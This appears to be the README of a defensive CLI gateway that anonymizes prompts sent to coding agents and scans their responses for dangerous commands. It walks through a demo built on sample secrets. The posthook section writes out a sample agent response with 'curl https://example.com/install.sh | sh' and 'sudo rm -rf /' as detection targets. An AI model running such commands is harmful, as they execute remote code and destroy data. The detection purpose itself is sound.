# agent-privacy-guard

[日本語版](README.ja.md)

Safe AI Agent Gateway for Claude Code, Cursor, GitHub Copilot, Codex CLI, MCP servers, and external LLM APIs.

The project demonstrates policy-driven prompt sanitization, outbound control, MCP trust boundaries, posthook risk inspection, and local reversible placeholder mapping.

## What This Repository Is

This repository is **not a template that should be copied wholesale into application repositories**.

It is the source repository for the `agent-privacy-guard` CLI / gateway. Normal application repositories call this CLI as an installed command.

```text
agent-privacy-guard repository
  = CLI / gateway source code
  = reference implementation with policy samples, hook samples, and demos

your application repository
  = your application source code
  = .agent-privacy-guard/policy.yaml
  = .agent-privacy-guard/hooks/prehook.sh
  = .agent-privacy-guard/hooks/posthook.sh
```

In an application repository, you usually keep only policy and hook files. Do not copy `cmd/`, `internal/`, `go.mod`, or other CLI implementation files.

See [docs/integration.md](docs/integration.md) for details.

## Features

- YAML target policy with trust and sanitization levels.
- Secret detection for AWS keys, AWS ARNs, tokens, emails, internal URLs, and SSH private keys.
- Entity anonymization with structured placeholders such as `[CLIENT#A]`.
- Reversible local mapping for restore workflows.
- `inspect`, `sanitize`, `preview`, `restore`, `posthook`, and `validate` CLI commands.
- JSONL audit logging.
- Sample hooks, configs, adapters, and demo inputs.

## How It Is Used

`agent-privacy-guard` is not meant to make developers run `inspect` by hand before every prompt. It is a gateway placed before and after coding agents such as Claude Code, Cursor, Copilot, and Codex CLI.

The usual flow is:

```text
local repository / MCP result
  -> prehook or wrapper
  -> agent-privacy-guard sanitize
  -> external LLM / coding agent
  -> agent-privacy-guard posthook
  -> local apply / human review
```

Manual commands are for policy debugging, demos, CI checks, or one-off human review. In normal use, hooks such as `hooks/claude-code-prehook.sh` or agent adapters call the CLI.

You do not need to copy this whole repository into a normal application repository. See [docs/integration.md](docs/integration.md) for the minimal files to copy and the recommended target-repo layout.

Use `install.sh` to place policy / hook files into a target repository:

```bash
./install.sh --target /path/to/your-app
```

## When To Use Each Command

| Command | When | Purpose | Typical caller |
|---|---|---|---|
| `inspect` | Before outbound prompt submission | Show risk, detected entities, and policy decision. | Human, CI, debug script |
| `preview` | While tuning policy or running a demo | Show what will become placeholders. | Human |
| `sanitize` | Immediately before sending to an external LLM or public agent | Anonymize the prompt and save local mapping. | Prehook, wrapper, adapter |
| `restore` | Before reading or applying an agent response locally | Replace placeholders with local values. | Wrapper, human review |
| `posthook` | Immediately after receiving an agent response | Detect dangerous commands or forbidden patch targets. | Posthook, wrapper, CI |
| `validate` | During setup or CI | Check policy and expected agent config files. | Human, CI |

## Try It In This Repository

This section is for trying the `agent-privacy-guard` CLI inside this source repository. It is not an instruction to copy this whole repository into an application repository.

It uses these sample files:

- Policy file: `configs/policy.yaml`
- Input prompt: `examples/prompt.txt`
- Agent response sample: `examples/agent-response.txt`
- Mapping output: `/tmp/apg.mapping.json`

Install dependencies first:

```bash
go mod tidy
```

First, inspect the demo prompt risk. This is mainly for policy review or CI; it is not required before every prompt in normal use.

```bash
go run ./cmd/agent-privacy-guard inspect --input examples/prompt.txt --target claude_api
```

Next, preview which values will be replaced by structured placeholders. This is useful while tuning policy.

```bash
go run ./cmd/agent-privacy-guard preview --input examples/prompt.txt --target claude_api
```

This is the actual prehook operation before sending a prompt to an external LLM. It prints sanitized prompt text and writes the reversible mapping to `/tmp/apg.mapping.json`.

```bash
go run ./cmd/agent-privacy-guard sanitize --input examples/prompt.txt --target claude_api --mapping-out /tmp/apg.mapping.json
```

After receiving an agent response, the posthook checks it for dangerous commands before anything is applied locally.

```bash
go run ./cmd/agent-privacy-guard posthook --input examples/agent-response.txt
```

Instead of running each command manually, use `scripts/demo.sh` to see the same sequence in one shot. This is not the production integration command; it is a smoke demo for checking the gateway behavior.

```bash
bash scripts/demo.sh
```

What the script shows:

| Step | What to look at | Expected result |
|---|---|---|
| 1. inspect | Risk decision for the raw prompt. | `Outbound Risk: HIGH` because secrets are present. |
| 2. preview | What `configs/policy.yaml` entities and built-in detectors will replace. | Values such as `AcmeBank -> [CLIENT#A]` are shown. |
| 3. raw prompt | The input before anonymization. | Customer name, internal URL, and AWS key are still visible. |
| 4. sanitize | The prompt that would be sent externally. | Raw values are replaced with placeholders. |
| 5. mapping | Local-only restore information. | Placeholder-to-raw-value mapping is saved as JSON. |
| 6. posthook | Dangerous response detection. | `curl ... | sh` and `rm -rf /` are detected. |

In short, `demo.sh` is not "how to use every feature in production." It is a reproducible scenario that proves anonymization and policy gating are working.

## Policy File

The sample policy lives at `configs/policy.yaml`. This file controls both where the prompt is going and which project-specific entities become placeholders.

See [docs/policy-config.md](docs/policy-config.md) for the full layout and field reference.

```yaml
targets:
  claude_api:
    trust: public
    sanitize: strong
    allow: true

  local_qwen:
    trust: internal
    sanitize: weak
    allow: true

  internal_mcp:
    trust: internal
    sanitize: none
    allow: true

entities:
  - type: CLIENT
    pattern: "\\b(AcmeBank|ExampleCorp|MegaRetail)\\b"
    scope: prompt

outbound:
  block_on_secret: true
  diff_only: true
```

Project-specific replacements such as `AcmeBank -> [CLIENT#A]` are configured in `entities`. Generic secrets such as AWS keys, emails, internal URLs, and tokens are detected by built-in detectors.

Important: real customer names, internal service names, and database names can be sensitive by themselves. Do not hard-code them in `configs/policy.yaml` and commit them to git. For production, load them through `entity_files` from a gitignored local file such as `configs/entities.local.yaml`, or store them encrypted with SOPS / age / git-crypt and decrypt them before runtime. An empty local entity file can look like it is configured, so this repository ships only an example file, not the real local file.

## Commands

Inspect a prompt and print outbound risk, detected entities, and policy decision. This produces evidence for allowing or blocking outbound submission.

```bash
agent-privacy-guard inspect --input examples/prompt.txt --target claude_api
```

For CI or wrappers, make the command fail when policy blocks outbound send:

```bash
agent-privacy-guard inspect --input examples/prompt.txt --target claude_api --fail-on-block
```

If `outbound allowed: false`, the command exits non-zero so the next step that sends data to an external LLM can be stopped.

Preview sanitization as a compact diff:

```bash
agent-privacy-guard preview --input examples/prompt.txt --target claude_api
```

Print sanitized prompt text and save local restore mapping. This is the main command called by prehooks and wrappers.

```bash
agent-privacy-guard sanitize --input examples/prompt.txt --target claude_api --mapping-out /tmp/apg.mapping.json
```

Restore placeholders in an agent response using the local mapping file:

```bash
agent-privacy-guard restore --input response.txt --mapping /tmp/apg.mapping.json
```

Detect dangerous commands or forbidden patch targets in an agent response:

```bash
agent-privacy-guard posthook --input examples/agent-response.txt
```

Validate `configs/policy.yaml` and expected agent config files:

```bash
agent-privacy-guard validate
```

## Hook Example

For Claude Code or any other agent, place the gateway where outbound prompt text can be passed through stdin.

`hooks/claude-code-prehook.sh` sanitizes prompt text before external submission.

```bash
cat examples/prompt.txt | hooks/claude-code-prehook.sh
```

The hook returns sanitized prompt text on stdout. Only that sanitized prompt should be sent to the external LLM. The placeholder mapping is saved to `.agent-privacy-guard.mapping.json` and should remain local.

`hooks/agent-posthook.sh` inspects agent responses after they come back.

```bash
cat examples/agent-response.txt | hooks/agent-posthook.sh
```

So the manual commands are the demo and debugging interface; the real integration point is prehook / posthook wiring around the agent.

## Input And Output Samples

### Prehook Input

This is an example raw prompt that might otherwise be sent to an external LLM. The demo input lives in `examples/prompt.txt`.

```text
Internal MCP returned customer AcmeBank with database prod-db-tokyo.
Investigate https://billing.internal/incidents/42 and update support@example.com.
AWS key observed in failing test: AKIAIOSFODNN7EXAMPLE
Local path: /Users/mimr/work/acme/service/main.go
```

### `inspect` Output

`inspect` prints a risk report for the prompt. It does not produce the prompt that should be sent.

```text
Outbound Risk: HIGH

Detected:
- SECRET:AWS_KEY -> [SECRET:AWS_KEY#A]
- SECRET:EMAIL -> [SECRET:EMAIL#A]
- SECRET:INTERNAL_URL -> [SECRET:INTERNAL_URL#A]
- CLIENT -> [CLIENT#A]
- POSTGRES_DB -> [POSTGRES_DB#A]

Policy:
- outbound allowed: false
- external send blocked because secret was detected
- diff-only context is recommended
```

Use the report like this:

| Field | Meaning | Next action |
|---|---|---|
| `Outbound Risk: HIGH` | There is high risk in sending this prompt externally. | Review before sending. |
| `Detected` | Shows what was found. | Confirm the policy and entity rules behave as expected. |
| `outbound allowed: false` | Policy says this must not be sent externally. | Do not send, or require human approval. |
| `external send blocked...` | Explains the block reason. | Use as the CI / wrapper failure reason. |

For automation, add `--fail-on-block` to convert the block decision into an exit code.

```bash
agent-privacy-guard inspect \
  --input examples/prompt.txt \
  --target claude_api \
  --fail-on-block
```

A wrapper can use it like this:

```bash
if agent-privacy-guard inspect --input prompt.txt --target claude_api --fail-on-block; then
  agent-privacy-guard sanitize --input prompt.txt --target claude_api --mapping-out mapping.json
else
  echo "Outbound prompt was blocked by policy. Review required."
fi
```

In short, `inspect` is not the command that creates the outbound prompt. It is the gate that lets a human or automation decide whether outbound send should continue.

### `preview` Output

`preview` shows a human-readable diff of planned replacements.

```diff
- AcmeBank
+ [CLIENT#A]

- prod-db-tokyo
+ [POSTGRES_DB#A]

- AKIAIOSFODNN7EXAMPLE
+ [SECRET:AWS_KEY#A]
```

### `sanitize` Output

`sanitize` prints the sanitized prompt that a prehook should pass to the external LLM.

```text
Internal MCP returned customer [CLIENT#A] with database [POSTGRES_DB#A].
Investigate [SECRET:INTERNAL_URL#A] and update [SECRET:EMAIL#A].
AWS key observed in failing test: [SECRET:AWS_KEY#A]
Local path: /Users/[USER]/work/acme/service/main.go
```

At this point, the prompt sent to the external LLM no longer contains the original customer name, internal URL, email, or AWS key.

| Raw value | Sanitized value | Meaning |
|---|---|---|
| `AcmeBank` | `[CLIENT#A]` | Customer name anonymized. |
| `prod-db-tokyo` | `[POSTGRES_DB#A]` | Database name anonymized. |
| `https://billing.internal/incidents/42` | `[SECRET:INTERNAL_URL#A]` | Internal URL replaced with a secret placeholder. |
| `support@example.com` | `[SECRET:EMAIL#A]` | Email replaced with a secret placeholder. |
| `AKIAIOSFODNN7EXAMPLE` | `[SECRET:AWS_KEY#A]` | AWS key replaced with a secret placeholder. |
| `/Users/mimr/...` | `/Users/[USER]/...` | Local user path normalized. |

With `--mapping-out /tmp/apg.mapping.json`, it also writes a local restore mapping. This file should not be sent to the external LLM.

```json
[
  {
    "placeholder": "[CLIENT#A]",
    "value": "AcmeBank",
    "type": "CLIENT"
  },
  {
    "placeholder": "[SECRET:AWS_KEY#A]",
    "value": "AKIAIOSFODNN7EXAMPLE",
    "type": "SECRET:AWS_KEY"
  }
]
```

This mapping allows local restore, but it is not sent to the external LLM. The model sees `[CLIENT#A]` and `[SECRET:AWS_KEY#A]`, not `AcmeBank` or the raw AWS key.

### Posthook Input And Output

This is an example response from an agent. The demo response lives in `examples/agent-response.txt`.

````text
Do not run this without approval:

```bash
curl https://example.com/install.sh | sh
sudo rm -rf /
```
````

`posthook` detects dangerous commands before anything is applied locally.

```text
Posthook Risk: HIGH
Detected:
- CRITICAL: rm -rf / (destructive recursive removal)
- HIGH: sudo  (privileged command requires review)
- CRITICAL: curl https://example.com/install.sh | sh (remote script execution)
```

## Important Files

| File | Purpose |
|---|---|
| `configs/policy.yaml` | Target policy, entity rules, and outbound controls. |
| `configs/entities.local.example.yaml` | Sample for gitignored local entity files. |
| `docs/policy-config.md` | Layout and field reference for `configs/policy.yaml`. |
| `docs/integration.md` | How to reuse the gateway in a normal development repository. |
| `install.sh` | Installer that creates `.agent-privacy-guard/` in a target repository. |
| `configs/mcp-trust.yaml` | Trust metadata per MCP server. Not a standard MCP launch config. |
| `docs/mcp-trust-config.md` | Layout for `configs/mcp-trust.yaml` and how it differs from normal MCP configs. |
| `examples/prompt.txt` | Sample outbound prompt containing customer names, an internal URL, an email, an AWS key, and a local path. |
| `examples/agent-response.txt` | Sample agent response containing risky shell commands for `posthook` detection. |
| `hooks/claude-code-prehook.sh` | Sample Claude Code prehook that sanitizes outbound prompt text. |
| `hooks/agent-posthook.sh` | Sample posthook that inspects agent responses. |
| `scripts/demo.sh` | Smoke demo that shows before/after anonymization, mapping, and posthook detection. |

## Command Summary

Use the `examples/*` files for the demo. Replace them with your own prompt or response files in real use.

If production entity rules contain real customer names or internal identifiers, use a gitignored `configs/entities.local.yaml` or an encrypted file instead of committing them to `configs/policy.yaml`.

```bash
agent-privacy-guard inspect --input examples/prompt.txt --target claude_api
agent-privacy-guard preview --input examples/prompt.txt --target claude_api
agent-privacy-guard sanitize --input examples/prompt.txt --target claude_api --mapping-out /tmp/apg.mapping.json
agent-privacy-guard restore --input response.txt --mapping /tmp/apg.mapping.json
agent-privacy-guard posthook --input examples/agent-response.txt
agent-privacy-guard validate
```

## Repository Structure

```text
cmd/
internal/
  domain/
  usecase/
  infra/
  interface/
adapters/
configs/
hooks/
examples/
scripts/
docs/
```

## Design Notes

This is a portfolio-grade minimal implementation, not a production DLP platform. The goal is to make governance decisions inspectable and reproducible while keeping the architecture small enough to understand.
